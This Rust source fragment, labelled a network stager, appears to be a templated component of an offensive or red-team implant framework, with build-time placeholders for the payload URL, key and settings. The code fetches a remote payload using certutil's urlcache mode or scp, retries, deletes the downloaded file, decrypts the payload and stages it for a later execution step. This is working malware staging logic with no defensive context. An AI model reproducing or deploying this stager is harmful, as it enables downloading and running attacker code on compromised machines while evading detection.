// --- Network stager (control technique fragment) ---
    use std::process::{Child, Command};

    /// Runs a downloader command, waiting up to `timeout_ms` for it to exit.
    fn run_cmd(bin: &str, args: &[String], timeout_ms: u32) -> Result<(), String> {
        let mut child: Child = Command::new(bin)
            .args(args)
            .spawn()
            .map_err(|_| $MSG_SPAWN_FAILED$)?;
        let deadline =
            std::time::Instant::now() + std::time::Duration::from_millis(timeout_ms as u64);
        loop {
            match child.try_wait() {
                Ok(Some(status)) => {
                    if status.success() {
                        return Ok(());
                    }
                    return Err($MSG_DOWNLOAD_FAILED$);
                }
                Ok(None) => {
                    if std::time::Instant::now() >= deadline {
                        let _ = child.kill();
                        return Err($MSG_TIMEOUT$);
                    }
                    std::thread::sleep(std::time::Duration::from_millis(20));
                }
                Err(_) => return Err($MSG_DOWNLOAD_FAILED$),
            }
        }
    }

    /// Downloads `url` to `out`, using the transport decided at build time.
    fn fetch(url: &str, scp_target: &str, scp_port: &str, out: &str) -> Result<(), String> {
        let bin_certutil: String = $BIN_CERTUTIL$;
        let bin_scp: String = $BIN_SCP$;
        let arg_urlcache: String = $ARG_URLCACHE$;
        let arg_split: String = $ARG_SPLIT$;
        let arg_f: String = $ARG_F$;
        let arg_o: String = $ARG_O$;
        let arg_strict: String = $ARG_STRICT$;
        let arg_p: String = $ARG_P$;

        if $IS_SCP$ {
            let mut args = vec![arg_o, arg_strict];
            if !scp_port.is_empty() {
                args.push(arg_p);
                args.push(scp_port.to_string());
            }
            args.push(scp_target.to_string());
            args.push(out.to_string());
            run_cmd(&bin_scp, &args, $TIMEOUT_MS$)
        } else {
            let args = vec![
                arg_urlcache,
                arg_split,
                arg_f,
                url.to_string(),
                out.to_string(),
            ];
            run_cmd(&bin_certutil, &args, $TIMEOUT_MS$)
        }
    }

    /// Fetches the configured payload and stages it for the next Execution step.
    pub fn run_exec() -> Result<i32, String> {
        let url: String = $URL_DEF$;
        let scp_target: String = $SCP_TARGET_DEF$;
        let scp_port: String = $SCP_PORT_DEF$;
        let key_hex: String = $KEY_DEF$;
        let nonce_hex: String = $NONCE_DEF$;
        let out = std::env::temp_dir().join(std::process::id().to_string());
        let out_arg = out.to_string_lossy().into_owned();

        let mut last: Option<String> = None;
        for _ in 0..=$RETRIES$ {
            match fetch(&url, &scp_target, &scp_port, &out_arg) {
                Ok(()) => {
                    last = None;
                    break;
                }
                Err(e) => {
                    last = Some(e);
                }
            }
        }
        if let Some(e) = last {
            return Err(e);
        }

        let mut bytes = std::fs::read(&out).map_err(|_| $MSG_READ_FAILED$)?;
        let _ = std::fs::remove_file(&out);

        if $CRYPTO$ {
            bytes = crate::decrypt_staged(&bytes, &nonce_hex, &key_hex)?;
        }
        crate::store_staged_payload(bytes)?;
        Ok(0)
    }
